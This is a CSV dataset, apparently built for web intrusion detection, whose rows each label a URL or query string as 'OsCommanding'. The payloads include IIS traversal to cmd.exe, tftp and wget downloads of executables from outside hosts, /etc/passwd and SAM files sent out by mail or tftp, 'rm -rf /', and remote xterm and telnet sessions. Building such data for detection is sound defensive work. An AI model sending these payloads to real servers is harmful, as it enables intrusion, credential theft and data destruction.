id,class,vector
7846,OsCommanding,/msadc/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/winnt/system32/cmd.exe?/c+dir
7851,OsCommanding,..%2f..%2f..%2f..%2fwinnt/system32/cmd.exe?/c+dir
7865,OsCommanding,/ucUe@Eo/lnoindsmoicbesrgoa/3XxKkBgYJF/fS-@passthrud7G/gEpOH4Ylyf-/17/vzMunionMJ5M/n66sot/sNUDVt_18ZC6e3F3/fQJ.B/ljQFWF/kL5JhlTCiHk-Z.asp?4le1l=3&i5oie84eRd=oobh.0FY&1raemttoe=120809
7882,OsCommanding,/data/..��../..��../winnt/system32/cmd.exe?/c+dir
7884,OsCommanding,/PBServer/..��../..��../..��../winnt/system32/cmd.exe?/c+dir+c:0
7888,OsCommanding,..%%35%63../..%%35%63../..%%35%63../..%%35%63../winnt/system32/cmd.exe?/c+dir
7897,OsCommanding,/682cNB0pm/l2@SgNJy-fY/bt/oewgaiaq.gif?bierhtstrhedkf=ciewp-cu9d&hlbaxs4Acxneiu=%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fbin%2Fcat+%2Fetc%2Fpasswd%7C&ttehli=6879214&tuteU=061821&qle=5344582&lsod=lwNTdpjyF2&edd=31834&tau8iAtnaySmos=lJ1.%40mTcK
7901,OsCommanding,/a58Bx/beocselg/fE0mXWXHgr.asmx?1tht=zy%3Dd9athtmpneRl%25iw&NDp.Y6-8jS=tmpme&Fdconnect5=3763271317&auoiaee=oen&lhoedati=%2Fperl+++%2Ftmp%2Fntmaansi.pl+-p7553&NvarhSVVq.se=8g&85=ynxsotuotssaefeo&0qemlnhdue=oroegqf&qlXq=sh7-Sc&S1p7Gooq=ve%3B4%27jaPUlss-nph-suh+like&rdeae13mtdlswm5=juRt3+e%3Agaain7shutdowno
7902,OsCommanding,/a2Y92FE2j/YworA0/8ieotjtaXRtTnr0t/tosiihsZx2bo6/8n/tKW2ORVKhTrccMsMnMo/lPfVAXULAV/uCrmupdate9oI9iHEM8R/raZC/iG.html?pnSqGqP6=3&19connect5Pform=saaO&aeheteaae=hfwSBu%40hc%3E%29age9&sebstltfeem9h1r=0692909&iqIle4sgainnsg=tcrXNaj3aEcteeU&0GIsock_streamZg=Inlh&etn=m%25+%3EoeaDt2d&Kunion4@Pybnph-0=%2Fperl++++%2Ftmp%2Fgeelni.pl+++-p1640&tfmZ3tkiod=xp_esntei&ptouoewWiiko=enPbmk8UZtK
7907,OsCommanding,/scripts/..%5c../winnt/system32/cmd.exe?/c+tftp%20-i%2062.107.47.226%20GET%20cool.dll%20d:\httpodbc.dll
7910,OsCommanding,/3OXuTgZBVOm2/tTE9Nx3078ogmli/ilDE5QLOMX7X_q-/htas/Qmy/Nouap/hT/OFg67__vxxq/5kJiQeNQ5dtklogIcmd/caziaeeJuhae/rhyaaeIkaclge7.html?
7911,OsCommanding,/et3wYO76Yhc@R_Mw/Ei5qehwteer.exe?eUUKgi@CqRW=123577&kb3g6=iOnMG0Pr8L&Lyrye5=dzL8nzR5-Pir&ecknes1no4n=%5Cnuftp+++++-p+++www.laassiie.com+%2Ferie%2Fstra%2Fit%2Ficndch%2Fniasen%2Fie&Mfeqmstuowo=rw3sil1eoeEr
7915,OsCommanding,/IE_/brOVT02Sq97h4-TzTu.jpg?G4PcmdST=Cs&_FNpT=dTf%5C8pmoasedqi&ngta30ssoiz=7996&rmZag5Clikeprocessing-instructionwRqz=0548509237&xs8nAecrTnroa=dEzZjFxLGHVo&cd=n&s6Vkwls=insQrorenjneeeo104&Xlt=loReandropot5m
7917,OsCommanding,/b-/pC@dGTXS/gzckkQJIdqG/c1vn6neev/lhhtn4eut/i9QEVXRPoc7d/AOem8H..i.aspx?IeegUaeCCnTqfp=+cwgettch%26m+s4OcrE&in=uq6&CfcOVWZxV@=mail++xls2rtpid3%40eaVP2sev.diili3.gov+++%3C%3C++%2Ftmp%2Fwu.c++++%3B&lth6csE=024
7929,OsCommanding,/eeotAeeih8lr1eeoat/sG_ZH-/lMOwz/o7CUC/4v5eW/3S.html?y2bo7ei=+&io=tftp+++-c++get+++++219.148.177.152%3A%2Fgenire%2Fmarear.exe+%7C&s8wSni=903&bDeo1do=7666815&eoe=aded3uent0aopdprtb&oifa=opAt4ttor&gemUiuSadhn=4560&ctovaecoj=yaafscdpntiPr&etp=cf9esiaMt%25IUnsmogroup+by85e&4PusroPR=r27nn+bnnexecc7zXan&awciiSirsIiseat=wtp7vlksasRm&UyGHE0mJ=srm%5C%5Bbsah%3F&aersletst1oeTme=sock_streamaIw%3Cwinntde&eue=h&pU9kzF6L=nh4
7937,OsCommanding,/estnxikamfA/j7iHIYo./Ofhe7vTNz7X370x/uvJlwBsFUF/Q4KrVga6GusraQ5/s_nbmf_KI8p2I_8w/eiltmbetnzin5lgtkr/fuzlo9/tfSW0iWWB8vkUG/w4igdelipnospeecdi/ptbhkrUnr/eetOsusri.php3?heuiiqt=420320&rdlkmea=%5Cn++uftp+++++-p+++www.icti.com+%2Fie%2Ficatetol%2Flaen%2Fen%2Fatmeet%2Ferge&05nD034q7.=229&ieetqP=tondhree1amedi
7938,OsCommanding,/cgi-bin/../../../../../../../WINNT/system32/ping.exe
7940,OsCommanding,/scripts/..%5c../winnt/system32/cmd.exe?/c+tftp%20-i%2062.107.47.226%20GET%20cool.dll%20c:\httpodbc.dll
7948,OsCommanding,/scripts/..%5c../winnt/system32/cmd.exe?/c+tftp%20-i%2062.107.47.226%20GET%20cool.dll%20c:\httpodbc.dll
7950,OsCommanding,/thln2fchprjendmaywb/Ztelnett/1ffefNir/chi4K/fJgH@CFfO7UP/0x2/XDLlVA@@VJQ9scriptM/h7Z/isrnstU9/eqENH67/aVV/a-.png?eom=00196726&ernsAttStu=45389388&ft=%27+%3B+++++rm++++%7E%2F.bash_history+%3B&wa8ryrsaibh=esicuet4ewmde+o&V_TaM=+%3C&acceptYaJ=tac&l7eal69nsti=nw07CxGSYsmG&Dtn5d=6305&eisi0eez7setas=sHT&bf9st6hezd=s0n9&ie=049209338&gRzecp=2
7955,OsCommanding,/euswalllrulXiraa4n/6oiBcNyCntM/tk18FZ2F/dsrsIeueb8ton9ee/l19ftrkaFmqY/bGTewindow.openPorzl.exe?edblseEetlmoFr=aV-tBnnwPDP&iyiporTt=gSaet%29z&eTg@99J=jre&oaJalike.Z=015&gtgcshdwotexad=3&dXW7ouZ=m2T2qi8knQb&rcpwindow.openy7Ub=n3Luw0c6t&kIEywzrKF3XT=rvvnasgLaa&ln0=n&eco=3bep2lhe&AkTahillnDIefeL=8&8bre9=%27+%3Bcat+++%2Ftmp%2Fres+++mail++totret%40rell.com++++%3B
7966,OsCommanding,"/scripts/file.bat"""
7969,OsCommanding,/jnTes/a53JfEHGJbElNX1O..u/hi49ehryhayU9/dVVYRcOAcbzJaw/5uereAoatbEu/aeeltn0/n3F1.SC315lE0jZWWa/45K/hTP@8riIN/rr/a2w@BrcP1hT_k9.tiff?
7970,OsCommanding,/o3daee/ySAAYn/3nyE/idLTs/7vIqEpFuti5w/oHee0aaiereiasn8/mGF/4asrr/otIQwHj2B5K-otvDuP.css?eldeeiv=aoD&El2f9s=0450&f2ooslxomeyt=386184&waleznHlo73foe=reitpiae6sim3zhQop&teNehe=egh&5ciaft=esuoeheidbrlfeeg&hariec=0676229218&K.FOLCOWDOM=mail+++++bio%40sndioa.n7eheyt.gov%3C%3C%2Ftmp%2Fwu.c+++%3B&biframehLwcqE8iframet=ldrahiykloaecclRNh&tisIesMea=p56laojioedt
7985,OsCommanding,/bLEbBCM_3D2SZM/oLg5q0YPmOUTR2d69Z/up8o8udes/asHtFq.xm2g9_/fXuEZOkA0MGGMNuvr1.v/SyioctofU/Zuv5/ucy6asjhcotAd5o/allanbiGRqjHfgody/L5RpYaPhRGninsert5/6qz8OX.jsp?d6ud=d0SLvOwR6&4MRuhtpassLqt=ie&t6emt95amtcit3Q=reoO1&e7ileaGe5nlo=hszdsNt&0d-pEp=oianull%7Elnewft3k%3A&eiTrh=%5C%22+++%5C%3B++++%5C%2Fusr%5C%2Fbin%5C%2Ftelnet+++www.etnatr.com+61917%5C%3B&aygTayi=43578274&riuraoioesln=arwtoopr4&YLMjimg=i%3Aeij+trtdPxsrnn&djlEmugN=sK9HiDy3Wk
7986,OsCommanding,/sOPO-ZGcZ.Ec_@w1Rb.php?IwgetXv4=216&7oeduEa2cPns=%7Cecho++++%22++Content-Type%3A+text%2Fhtml%22+++++%3B+++++echo+++%22%22+%3B+++id+++++%5C0
7994,OsCommanding,/msadc/..���../..���../..���../winnt/system32/cmd.exe?/c+
8001,OsCommanding,"teez6cftpO=""     ;  telnet     10.236.214.174   80   ;"
8008,OsCommanding,/mTZgMu/whereeEnBouH_/kxlmqPrW8zMfK/gp4.QqUeM/i35c/Esiele/rhddfoYVyra/tEhu9yoiswan8ogcad/tgcJV-@fwV8ANKV7-wKP/iTjJ3nyy5IcsRyqXmu7/FaMrI6KTt7.css?aH=%5C%22+++%5C%3B%5C%2Fusr%5C%2Fbin%5C%2Ftelnet+www.chiean.com+++++82809%5C%3B&dzJall51script=tsetc&e0coWTmcene=73532&1ptsnepn=3&lrmclxt=65211156&srgtdNrsr=betmiEtm&kgoRhunihsS=elmzGaRMwwu&be2eRrFa8=tow3+hacdrh%5Bu&mEesHtitwCp=044925&uehtblnterte=1
8010,OsCommanding,/data/..��../..��../winnt/system32/cmd.exe?/c+dir
8013,OsCommanding,/scripts/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/winnt/system32/cmd.exe?/c+dir
8022,OsCommanding,/scripts/georgi.asp/..��..��..��file.ext?
8027,OsCommanding,"eBEeOmueadL=va&a2cghekop6oaa=yynv5arP8UEE&c9e=0&dll7ami=hDoiwfrjcsUd&railncoregoaI7=iuhUn8antstt5ei8&5KRg=awVV9C0We.8&wetees=raAn%ar a&enilrntmgt=/bin/ps%00   |&vzumet=:ov 3ecg4hr""$S""urj&Fe.tV=309&dfhieinqeco=guHfnwno"
8030,OsCommanding,/msadc/..%5c../..%5c../..%5c/..�
8038,OsCommanding,1Aaojmmto=92193&T39nuntigoTda=193.187.10.82 |    tftp 192.168.10.33 evil.txt&f6y1J@objectl=[  oh&awhere4r-5=nH7Yj2t8
8041,OsCommanding,/9Q4ci8OD/iDzx1/tbHVbM@ftca-0/bsOrwptvA/neshnUuilrgaqn/hKjEvEfyw/1coantl/SzJrUYs/aqU2OCkNUFo1Uk/imBVK8@J/ksewajoqAfoaqdsd.cfm?ohrnnron=ShatR&ew0slcas1oliAbr=546388
8084,OsCommanding,..%u00255c..%u00255cwinnt/system32/cmd.exe?/c+dir
8085,OsCommanding,/data/..��../..��../winnt/system32/cmd.exe?/c+dir
8095,OsCommanding,/h_U-cNPhzIP3FE/nDTZ_8hCLxFQ.msf?wT16wozsevy=++%3B++++echo++%3B+++++w+++++%3B++++uname+++-a++%3B++++id
8100,OsCommanding,uarhtItdi4f=eaEa6rhbodyac1at&r8ei=polikeinput3&3suLgroup by=03&rHporldetfrlcp=natli:p&eikeNntTsmf=ahome&ntywaba3lamueoe=e~e&jeca6ahtrjhly=oRhYqK&geuOleoiZ=84953&lqiUQeeosoaa=91.113.40.228   |    cmd.exe /s&t4c=>arxa&tIdeeuht7oMmd=tcanuorckEattp
8111,OsCommanding,/lvbscriptyeFRpH/meodtSeea/evW0cZza51F@ITl6d1Uy/l-i4/uJ3USTPcGK5F/uaq1paba.jsp?ay=233&7b9etth=%7EgDl&aeyc3ohAreti=0E%3A&weo6echtfnH=bMqip2P_VB_&e7sianhniosa5=%5Cr+++++xterm++-display+++97.188.139.179%3A0.0
8119,OsCommanding,/samples/..��..��..��..��..��../winnt/system32/cmd.exe?/c+
8120,OsCommanding,/vfoeaeuidts1aaGe/hs5oneltteWgycb/nla2LikqJVrt-VnDC/seXR..nPbxxLg0EUxobJ/ee/txD/3mK3m5b@M4XGX9-.zJS/owt3edtlaitLybYty/0gN_.ZJhne-3yf/twoik/le40jtLgrg6ERBWgHB/nsn5ereelyce.png?e0oapy0ztoA=aclieate7d&5fagat=74372376&los7r=mB_ACb&edtqa2axostl=env9to7mOhIsnXvH&lseee=tftp++-c+get++63.32.226.52%3A%2Fns%2Fon.exe+++++%7C&oeeeJasr=aeepositioneewtllbo%3E&ninN=3009445&tmst2=wKr.&aboheeorca5=win&dcrnacYeeybo=-E&wdptn9lmht=Oarao5ss3t&ulBApHOUAu=nhaeoauiiz&niuc73rfglhlsre=passwdcq&tlar=hs
8128,OsCommanding,/PBServer/..��../..��../..��../winnt/system32/cmd.exe?/c+dir+c:0
8130,OsCommanding,/images/.%2e/.%2e/.%2e/.%2e/winnt/system32/cmd.exe?/c+dir
8134,OsCommanding,FslotnUriioE= itC7&vd8enhwetepssn=aedt=boqbn1&hya6hhp=6908&pcutev3snfoA=oops;cat   /etc/passwd    |    mail     your@kezh.com&hVrj..2A.qyn=qRaH9BF_kw&g1ieupteey=8&can5iyae150n4i=125219
8147,OsCommanding,/iisadmpwd/..��..��..��..��..��../winnt/system32/cmd.exe?/c+
8151,OsCommanding,Uasayrlrl9tst=rqjiUmLz4&st7rhmrjiwnfuw=578769&ipuequkri=893591&n3nart9ezfota=?euhnEt&ooaer=\nls /root/&ad87n8b=anfn&Dawtyfae=uLtLoSHJHBCz&lE7et=0757&1rddeu7=she(sh&cd0ron3eeNoEro=bgiwreplace&uehgmaisp=372&oae3=7853306573
8154,OsCommanding,..%u00255c..%u00255cwinnt/system32/cmd.exe?/c+dir
8164,OsCommanding,/ipK5KFPYCsg3ZHlzsn/TPxtermTBq/zoiNehnewrmae/aymLen8nafmetm/6A4cboAWXCk5e/mrn/unionrm/hh/tozattiniee8uofuc4/sa0ateLuhseqaiirhr.tiff?ddn=ecmdsranea%40hde%5D+f&esusrw=%7Ccat++%2Fetc%2Fpasswd
8170,OsCommanding,.%u002e/.%u002e/winnt/system32/cmd.exe?/c+dir
8187,OsCommanding,/images/.%2e/.%2e/.%2e/.%2e/winnt/system32/cmd.exe?/c+dir
8189,OsCommanding,..��...��..��..��..��../winnt/system32/cmd.exe?/c+dir
8190,OsCommanding,..%c1%pc...%c1%pc..%c1%pc..%c1%pc..%c1%pc../winnt/system32/cmd.exe?/c+dir
8197,OsCommanding,%u002e%u002e%u002f%u002e%u002e%u002fwinnt/system32/cmd.exe?/c+dir
8206,OsCommanding,/ewsniou/9nx7orp3mtaaj/catUZ.nc2NoXUnOB/taoe/gLgp6T/lr9t0s9/Esm201atws/hu@I4r2Vy.jpg?io=iH.&5o1taoetn1ercre=1144&9annnnursi=Ekhztooeti&iaelBtotylsrti=53&zAtwherez8EM=yjUB8KUjqC&ltq1errcr9m=tEaeehkx2sAn&eewine=74728226&ieO=%26IIga
8213,OsCommanding,/iisadmpwd/..��..��..��..��..��../winnt/system32/cmd.exe?/c+
8215,OsCommanding,/scripts/file.bat/..��..��..��winnt/system32/cmd.exe?/c%20dir%20C
8221,OsCommanding,/scripts/..%c0%qf../winnt/system32/cmd.exe?/c+
8226,OsCommanding,/scripts/..%c0%qf../winnt/system32/cmd.exe?/c+
8229,OsCommanding,/IISADMPWD/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/winnt/system32/cmd.exe?/c+dir
8235,OsCommanding,/bin/alibaba.pl|dir
8237,OsCommanding,/r5zbDQL/Otosodir/mVSWEH0lvChUI6niTk/y1MJvaroK/jk6Ktmp_ZhyySxnodevQ/etbimr82mn0/gm6raeetlrdai1osndv/9p7ufKG3H8odEVuyI9lO/toTzY/378Tku_T./eQ47nNd.mdb?NxelaDk412aeerx=%27++++%3B+cat+++%2Ftmp%2Fres+++mail++++es%40retail.com++++%3B&Earse=%3BexecmnrEdocumentxe%2Bh&_Eq1=1854065&au=Fsh9lieo&oebvaepqiiwa=665518&xed=a14ssi&ThhH=IrQaim+rAeat6
8239,OsCommanding,/scripts/..%2f../winnt/system32/cmd.exe?/c+dir
8243,OsCommanding,dihLan=%&aerwoNqc=129.45.167.18     |  tftp     -i     136.56.216.35   PUT sam._&49tRigs=eHsbBz0wrj&rahoLiotIeocEhf=heonoMecyn&objectKuYninclude=52&eelctwamh=kEGZUjL9
8246,OsCommanding,/iwLcoitatdt7us/seytnhahkn/aaJ5rOq9WtlBv6s/OjhM/kkAq/o81@zdhCA@wT.exe?t6fNOYlogxL=6o&QAI.lN7Bs=b4ceosv&pd6ge8iitaonin=+++++%3B+++echo++++++%3B+w+++++%3B+uname++-a+++%3B++id&tbeyuirhoh=d7lwiHouj&ehoeWe28r=68082&9RAvhBpNAU=rthr%3FO%7ESdS&e0G-OyQ7=1&fonblejBfiAEbi=w6t&1ooh=67&son00nyks=sstR
8248,OsCommanding,/cgi-local/alibaba.pl|dir
8269,OsCommanding,/scripts/..�
8270,OsCommanding,/qidorDF7.8oMRqQo0J/72AidgrQnc-Ztmp.tiff?-_ZSJCG1y=edp&sk97Lget4fln=tatroekod9mrasiqp&mwrnl2gbtHsll=ls++++-las+++%2Fhome%2F+++%7C&0IW0KMhnRTEK=a40&titetGoc1bint5x=95692650&neunr3nnllaojux=26&E87nbwztag=s6o&jY7adminFps=1VqNHlhp8gU
8271,OsCommanding,a8wnntp9lsgBeh=hrrhe@5&8fleb8sesOg4y=dlz_Iku&ecerhe=|cat   /etc/passwd&o4YA3Qlu=495&hoocoqvera=hqh@GUZxsP5a&eyORV=Ht2i
8274,OsCommanding,/backup/..��../..��../winnt/system32/cmd.exe?/c+dir
8281,OsCommanding,/images/.%2e/.%2e/.%2e/.%2e/winnt/system32/cmd.exe?/c+dir
8283,OsCommanding,/rs/zergan/sntei4hTortn/TAUv5NnoNELrHJ5.css?0aj9PK-4hHvpN=427421&Drcjestthndefng=032&3dleehw=nF%40Vv6qfk&oaedt=3ahstlw+twe%5Cnode+eklt%24&wttrlatty=nkti%24hzlcsock_streamae%5Bn6&7cKoqfeSee=ioe+di&v2ohzsEceb2dmd=i0or&1F.8pfJfHBr=40.2.106.138+++%3B+tftp+192.168.10.33+test.txt&e9uqsno8=8%3D5i&senaeoIa=aoenht+ygnO&ieci=mmcDQ-&GeeteRtiI=196671&tttr=paj8&DEnltc=nim2itidsanz8ttXN
8284,OsCommanding,Oce8oudotR=et rTov&rdh=asnL\ umselect7%'&arhnioa=7&resbucihr=mail CgetdEepx@y5entt.dbuyqAg.gov <<    /tmp/wu.c   ;&legneszTf=s2WmHpTR&pihntocseesy=hr&pebse9srDtnli7=lj_VOpA2_&siesg25oe5nas= ylHnatU@ep&mZowaha=943572&diEhsEwbtcy3ttu=01585578&ziath=7931049&oemtsTcm07=t;ene4insertconnect]1d&httI=eb
8290,OsCommanding,..%c1%pc...%c1%pc..%c1%pc..%c1%pc..%c1%pc../winnt/system32/cmd.exe?/c+dir
8302,OsCommanding,/iisadmpwd/..��..��..��..��..��../winnt/system32/cmd.exe?/c+
8320,OsCommanding,/oFfiDsam/upvMuiZHa7./tPtQ9j-3kgkR@wpoC/rv346eTLP8YACSf/itp/8hnYyPVQ/dpya8rubbsctoin/spnbl2ohy/B@6RTGAdvbscript.htm?NoEesh58aso7=7anyg&2iixosovEhnd=509&csaettbdfdte=uanmvson&S2dioerc=%250Axterm+++++-display+www.laarlellllel.com%3A0.0+++
8333,OsCommanding,..%%35c../..%%35c../..%35c../..%35c../winnt/system32/cmd.exe?
8339,OsCommanding,..%%35c../..%%35c../..%35c../..%35c../winnt/system32/cmd.exe?
8348,OsCommanding,nePe0ic0ril=libhaving)bobjectt?othmailtbn&mpiouhinoh9r=41833754&vNNrhimgAa3=ol1sly&oojLaosopT4d8i=eepakt&ZX3uJcmdh=60228849&epcg2teAuw=r&oltit7yqatssra=iceobody&ec8f=4905&oses4te=i4sc&l0ulis8ewgde=b&SfoswGlaccyaeyi=22068&h5unenb=4&eatoli=Di%u
8356,OsCommanding,nash6reeew=65775&yqiiLtlxooc=%0Axterm     -display  www.inlaanin.com:0.0 &ninnn=o3iq2wotpmojyt1ii
8361,OsCommanding,0WwNwUN7=ebaait&rmH77j.FM= tn(div\wsch&UXS-M7cNwBU=%0a    cat     %0a/etc/passwd   %0a&tsm83aEa1a7=eO1Tidoptb~milndtU&lRnam=873&ey=iPb7&EnpoNaSSh8am=ot6ts
8368,OsCommanding,/Mv/7lcNBAoyweQ1QK6p/maeietrtht2twehsa/fxjcmieoeO/sEaauaaes/fivaLxG3iJSh/edGxdeK3r2/nwlieyhmra3pe/nyMyUtt2eigIdbmt5/ikC8Y4_/t.2M9@s.js?Sbau3d0a0hm=uVzEC8A.7S&nt=yorphpATsystemjak&yol8seeaY0rDie=ree-azF+u2ob&eagneae1=78609&grzoaln34iime=955128&eobpieyi5r=3731068525&efrest0dfnn6i=4cAeeddc6rie
8371,OsCommanding,/eT0/cWT3L3_yoIL1uqfD/3e6qtCd/fw-/poy/eq0lu_OLQom_kUR/sdu1rmkdd0e/t9Oq1kqt5uy/aH@-ffHf3EQqGAOjsj.php4?h8Coefax8xf=856763&h9olrkpnkee=igeni&1mtdnhUmo=54&ta9hbleI4F=datieissiO&hatabewi6t=t7homeMdsnu%3AbinHeeh&YdivBlCLIs=ho7eh&tbApbzai=9223879016&oTtat8mcc=r%3F0na
8385,OsCommanding,/ua/.19J18Q9D93h.css?cia0tlcA8ait=s1OSrGgQ&hpisej0oi=geljgn+&uc7=r-h&9suc7ocoldd=%5Cn+++++wget+http%3A%2F%2F110.181.111.144%3A78140%2Fnftp.exe&4aiccscrhol=ni5iouha8d&NwnPs=oh&taelhehn=ntlumxtOetaf%2F&doerwiiuttoq8=qiqgltn5uA&Rwo=4nubahyrldAanle3n
8395,OsCommanding,/ssi/envout.bat?|dir%20..............1
8396,OsCommanding,..��...��..��..��..��../winnt/system32/cmd.exe?/c+dir
8399,OsCommanding,/Dtols9acO/cniU2ftoonNeNi/ioBmHjw8GJ@2cHt1/wUd3JBN9@K/rPEsqmrfg0T/tG588dUzr4kUex/3cds0tidalAanacy/87/iyS2/cJ/mFZ8qOgx6qhENx7YTs.dll?jlivandut=9&tkn7aersg1snpr=t0hlosC%29htpass&atiooR=r%27o%2Bekro%3Bja&ant5rTaln0tu=oops+++%3B+++++cat+++++%2Fetc%2Fpasswd+++%7C++++mail+++your%40awv.com
8403,OsCommanding,.%u002e/.%u002e/winnt/system32/cmd.exe?/c+dir
8405,OsCommanding,%u002e%u002e%u002f%u002e%u002e%u002fwinnt/system32/cmd.exe?/c+dir
8410,OsCommanding,O0yalibpnfvrv=| cat /etc/passwd&rpassthrutTXs1hdxy=797730
8412,OsCommanding,/handler;cat
8414,OsCommanding,/wsdjfiidtN/eieo6sqdatl2/G-c/Idphoec/rAdtrwBOEmdTl@w/hletcfsqa/ezlyXB@SosrB/esY3fF/mHpXedu4WIjA5sYG/euVYj4lLu9Hdw.jsp?dJR8=8adi3nefae046j&u5ginxdooiosO=%7Egi9eusystemmconnectcoptceh7&aRRp=7&hptmpvYY=oMpdDXwN_0.&tCgv=9814&pyYeyaitnawE=996&vsXeeiceEasdmio=3438276&oebuuoep=m%5C%3BtWaw&aiqntedl6hmpN=wohrnfrom&rtreN0h=m%5Diee&ne=99698&yKq2QAMQOC@=wshnaeao&vlpraitn8iddrHo=3
8415,OsCommanding,/egFTSLT.Jvbh.9Ocfl/ioZEe6Bw6D/tc1shq6tnhbd/rCiAXSFR/MR/crmYIPrcpm3shutdownmrm/shutdownY/Ih8nA0ri/lSDrkEFgSG/sCtefmlimeooyaE0i8hr.gif?ijteEdzohandh=7&bsg5hw=3e&euvtc=%22++%3B+%2Fusr%2Fbin%2Fwget+www.ndstmeictist.com%2Fneitme+++++%3B&clTeeehrPytqnt=767457930&s2ddhKdc=suwherebt&sAt3yYA=where9fnsme+ahhs3%3D
8418,OsCommanding,/su7i1cwSsrd3ebist/aKly/sGg/wNYL/tRR31MGOGPB/sraitiGetp/rdeaa8deFs/xE0vi2/noeeeuatuIyXttmeogi.bin?oi=Rpn&eWhzacaTc=%7C+dir+++..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C..%5C%5C++++%2C&uGeIxT=+e%26q&Tmochaap35v=zoz%40%3Fb
8421,OsCommanding,/bin/alibaba.pl|dir
8423,OsCommanding,/tvtltEneNccdytocsw/YyPinWIy9PUAvtHO/y-nMSgQQe8o/hH1yptX8-vA/pi/txwit4ntAnAtns/oImTK0madq4fz-I5fKR/yv8IQ@7rCZaqR7Uf/mfP5/jasjesan3/xbrg3.html?Gr=%60++rm+-rf+++++%2F++++%60&cltsimHlaIo=51861
8427,OsCommanding,/NpasswdsG.hxRJD/oat/rT/eMU7cq.6/bie/baeNrtth3/OvxIzCtelnet/r5pdo1/Kv@04betweenqZJiframeHLaccept.sh?rptdenorb=e8hs&xeeotmzqstl=stmn%40hugcmaiaibin&0Kolddnlhtezfnr=+l%7Es+ent3io&ga3naka=cmt0nuratrhA&aen4ebo8shma=4&r9sisnobsaiij=30&Cphi=aHTkZqsf&5sra=rE&tangnnpdszomrT=5Ilb0EhE4g&erdiesTsewr4=Hs&ojsAodregeAott=argiz587petrshbcoi&mBnevalbsmetaautoexec=et
8436,OsCommanding,/cgi-bin/../../../../../../../WINNT/system32/ping.exe
8442,OsCommanding,/_vti_bin/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/%2e%2e%2f%2e%2e/winnt/system32/cmd.exe?/c+dir
8445,OsCommanding,/wKJbJR53bS/57OZ/k3/dgt0tsqgeanpoFIYicr/r1j/gF4.0zR0.RgS/E9fUCUFexec/nPXDT.sh?byiaoSyf=h%3Dd+Y%28Ao%7Cponiimglhdropd4a&oddej16trt=er%3A%25%3A&ol7viNcaeei=%7Cecho++++%22++++Content-Type%3A+text%2Fhtml%22++++%3B+echo+%22%22+++%3B++++id+%5C0&20e=+aT2+atsn
8448,OsCommanding,/s8qRz8Vi-xIQ_tPZIs/pXugCDwJXUAXZmxy/eCw/IeNsJ-4haEFj/uXc.I-zAHMAE9H5J14hH.htm?tfaapnd=5aia2pahneexeca%3Aad+%5C&artsa6us2le=hyncneerSEeYea&mytNaTeO3=528534&gcSk2iGKkLu=%60+rm+-rf+++%2F++++%60&wwebhhnsy=%3B%24sta&_F1xTUDjZm48=qdogca0dltnEtn&E64x=28&nttinkayr5uuurs=153720&Xoaida0P8thk=9244261735&eqnnhm=467059062
8450,OsCommanding,/iisadmpwd/..��..��..��..��..��../winnt/system32/cmd.exe?/c+
8457,OsCommanding,..��...��..��..��..��../winnt/system32/cmd.exe?/c+dir
8483,OsCommanding,hdihcTue=713122362&hdcmr4e5eattH=76198&bgsoundjv0Mmetaq=auoe
8485,OsCommanding,/optRE1e/AshutdownlFCM6kH/gq/ureplaceg.tiff?unph-o6wOfMnopenRu=37062403&ewlfoliicm=e%3Eyk&Rwb8ltE3l9lm=08507&aoIrat8otleea=lqeqbodyrlocationdrxatw%40netcattd&eo=nvmiyin2hCmhod&ute9ums7ehhs=%28ip%25eep+o+hp+%5B%2Bu&scnii=8sd2atIl&tcoi7ilaanSe2l=%7C+++id+++%7C&styleC1OwHPTrcp=Uterhseruadnt&sitii8exwdfda=c2y
8497,OsCommanding,/scripts/..%5c../winnt/system32/cmd.exe?/c+tftp%20-i%2062.107.47.226%20GET%20cool.dll%20d:\httpodbc.dll
